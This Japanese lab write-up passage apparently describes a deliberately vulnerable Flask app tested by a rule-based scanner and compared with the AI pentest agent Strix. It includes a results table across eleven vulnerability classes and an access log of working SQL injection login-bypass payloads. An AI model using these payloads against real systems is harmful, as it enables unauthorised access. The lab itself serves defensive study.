| コマンドインジェクション | `/diag_safe`(修正済み) | 5 | 0(誤検知なし) |
| パストラバーサル | `/file`(脆弱) | 3 | 1(素の`../`での脱出を検出) |
| パストラバーサル | `/file_safe`(修正済み) | 3 | 0(誤検知なし) |
| CSRF | `/csrf_transfer`(脆弱) | 1(トークン無しの偽装リクエスト) | VULNERABLE(トークン無しで送金が成立) |
| CSRF | `/csrf_transfer_safe`(修正済み) | 1 | Not vulnerable(403で拒否) |
| IDOR/BOLA | `/idor_account`(脆弱) | 1(他人のuser_id指定) | VULNERABLE(adminの機密情報が取得できる) |
| IDOR/BOLA | `/idor_account_safe`(修正済み) | 1 | Not vulnerable(403で拒否) |
| デシリアライズRCE | `/deserialize`(脆弱) | 1(攻撃コード入りpickle) | VULNERABLE(`id`コマンドの出力がレスポンスに漏洩) |
| デシリアライズRCE | `/deserialize_safe`(修正済み) | 1 | Not vulnerable(JSON構文エラーで400、コード実行なし) |
| マスアサインメント | `/signup`(脆弱) | 3(`is_admin`のtrue/1/True) | 3(全パターンで管理者権限が付与される) |
| マスアサインメント | `/signup_safe`(修正済み) | 3 | 0(誤検知なし) |
| SSRF | `/fetch_url`(脆弱) | 2(IP直指定/`localhost`) | 2(内部限定サービスの秘密を取得) |
| SSRF | `/fetch_url_safe`(修正済み) | 2 | 0(誤検知なし) |
| アカウント列挙 | `/register`(脆弱) | 1(既知の登録済みメール) | VULNERABLE(409エラーで存在が判明) |
| アカウント列挙 | `/register_safe`(修正済み) | 1 | Not vulnerable(常に同じレスポンス) |
| 格納型XSS | `/review`→`/reviews`(脆弱) | 1 | VULNERABLE(投稿が未エスケープのまま一覧に反映) |
| 格納型XSS | `/review_safe`→`/reviews_safe`(修正済み) | 1 | Not vulnerable(エスケープ済み) |

(パストラバーサルは3種のペイロードのうち1種のみ検出: この最小アプリは入力をそのまま
`os.path.join`に渡すだけなので、URLエンコード済み(`..%2f`)や二重ドット変種(`....//`)の
回避テクニックは素の`../`と違って文字列として素通りし、意図通り「刺さらなかった」。
これはこの簡易実装の限界であり、実際のWAF回避やエンコーディングのバリエーションを
網羅したい場合はペイロードと検出ロジックの拡充が必要。)

脆弱性クラスを追加する方法: 「GETパラメータにペイロードを注入してレスポンスを比較する」という型に
合うクラス(SQLi/XSS/cmdi/traversal/mass_assignment/ssrf/account_enum)なら、
`auto_vuln_scanner.py`の`VULN_CLASSES`にペイロードリストと`detect()`関数を1組追加するだけ。
CSRF・IDOR/BOLA・デシリアライズRCE・格納型XSSのように型が違う(セッション状態を跨いだ判定、
攻撃用バイト列の組み立て、2段階のリクエストが要る)クラスは、`session_vuln_check.py`の
`CLASSES`に同様に`check()`関数を1組追加する(型が全く新しい場合のみ、さらに別のスクリプトが要る)。
いずれにせよLLMの「判断」をルールで置き換えている分、
対応したいクラスの数だけ実装を増やす必要がある(これがStrixのような汎用エージェントとの根本的な
違い — Strixは未知のケースにもLLMの推論で対応しうるが、このアプローチは既知のパターンにしか反応しない)。

Strixとの違い(全体像):

| | Strix(AIエージェント) | この簡易スキャナー |
|---|---|---|
| 判断方式 | LLMが毎ターン次の一手を考える | 固定ペイロードを総当たり |
| 対応範囲 | SQLi/XSS/SSRF/認証不備/ビジネスロジック等、何でも(LLMの推論次第) | `VULN_CLASSES`に実装したクラスのみ |
| 必要なもの | LLM API + Dockerサンドボックス | Python + requests のみ |
| 柔軟性 | 未知のパターンにも適応しうる(が実行が不安定だった) | 既知のペイロードのみ |
| 今回の結果 | Turn8まで進行、結論不明のまま断念 | 即座に成功、再現性あり |

## WSL側の実機アクセスログでも再現確認済み

クラウドサンドボックスでの結果だけでなく、WSL(Ubuntu、venv経由でflask/requestsを導入)で
`./scan_all.sh`を実行し、**完全に同じ検出結果**が再現することを確認した。Flask自体の
アクセスログ(ステータスコード)からも、これが見せかけではなく本物のSQL構文として
解釈されたことが裏付けられる:

```
GET /login?username=zzz&password=zzz                    401  (正常系: 失敗、期待通り)
GET /login?username='+OR+'1'%3D'1'+--&password=zzz      200  (SQLi成功: 認証バイパス)
GET /login?username='+OR+1%3D1+--&password=zzz          200  (SQLi成功: 認証バイパス)
GET /login?username=')+OR+('1'%3D'1'+--&password=zzz    500  (SQL構文エラー漏洩)
GET /login?username='+UNION+SELECT+NULL,NULL,NULL+--...  200  (SQLi成功: UNION注入)
GET /login?username='&password=zzz                       500  (SQL構文エラー漏洩)

GET /login_safe?(同じペイロード全部)                      401  (全て無効化、期待通り)
```

無害な入力(`zzz`/`zzz`)では401(失敗)だったのに、SQLペイロードを入れた途端200(成功)や
500(SQLエラー)に変わる — これはサーバー側で実際にSQL文字列が組み替えられ、クエリの意味が
変わったことの直接的な証拠。シミュレーションではなく本物のSQLiが成立している。`/login_safe`
側は同じ入力でも全て401で変化が無く、パラメータ化クエリが効いていることも対照で確認できる。
(XSSはステータスコードだけでは判断できない — レスポンス本文にタグが未エスケープで残って
いるかどうかで判定する必要があり、`auto_vuln_scanner.py`の`detect_xss()`はそちらを見ている。)

## 補足: これは「Strixの簡易版」ではない

`auto_vuln_scanner.py`/`session_vuln_check.py`は便宜上「Strixの代替」と呼んでいるが、正確には
**Strixの一部機能(次に何を試すかの判断)だけを、既知の11クラスに限定してルールに置き換えたもの**
であり、Strixそのものの簡易版ではない。Strixが持っていて、このスクリプトには無いもの:

- **攻撃対象の自動発見**: どのURL・どのパラメータが存在するかを、人間が指定しなくても
  自分でクロール/ブラウジングして見つける機能。このスクリプトは`--url`と`--fuzz`を
  人間が指定する前提。
- **未知のパターンへの適応**: LLMの推論により、ペイロードリストに無い状況にも対応しうる。
- **汎用性**: SQLi/XSS以外の任意の脆弱性クラスも、LLMが自分で考えて試せる。

つまり「Strixの代替になった」わけではなく、「このPoCで実証したかったこと(既知の
脆弱性パターンの自動検出)は、より簡単な方法で達成できた」というのが正確な位置づけ。

## このラボとStrix PoCの関係

- Strix PoC([`../strix-local-poc/`](../strix-local-poc/))は「AIエージェントに自動で脆弱性を見つけさせる」
  という、より野心的な目標に取り組んだ(local LLM・Groq・OpenRouter全てで構造的な壁に当たり、未完のまま)。
  Strix自体はSQLi専用ではなく、SQLi/XSS/SSRF/認証不備/ビジネスロジックの欠陥など広範囲を対象にできる
  汎用ツールだが、本PoCでは`--instruction`でSQLiのみに意図的にスコープを絞っていた。
- 本ラボは、同じ「脆弱性を実際に試す」というゴールを、エージェントを使わずに最短距離で達成した。
  最終的には「LLMは不要だった」という結論に至り、SQLi・XSS等11クラスをLLM抜きのルールベース
  スキャナー(`auto_vuln_scanner.py`/`session_vuln_check.py`)で自動検出できることを実証した。
  さらに、実際にStrixを使った第三者のレポート([Zenn記事](https://zenn.dev/turquoise123/articles/df481032f6b405)、
  OpenAI gpt-5.1でブラックボックス診断を実行し6件検出、所要30分・$19.77)との照合で、
  格納型XSS・マスアサインメント・SSRF・アカウント列挙の4クラスが抜けていたことが分かり、追加した。
  (なお同記事はOpenAIという有料プロバイダで実際にStrixが完走しており、本PoCで「Strixは動かせ
  なかった」という結論はローカルLLM/Groq/OpenRouterという安価な選択肢に限った話だったことも
  裏付けている。)
- 両者は競合するものではなく、「(少なくとも既知の脆弱性パターンについては)ツールに頼らなくても
  検証はできる」という補完的な結論を示している。
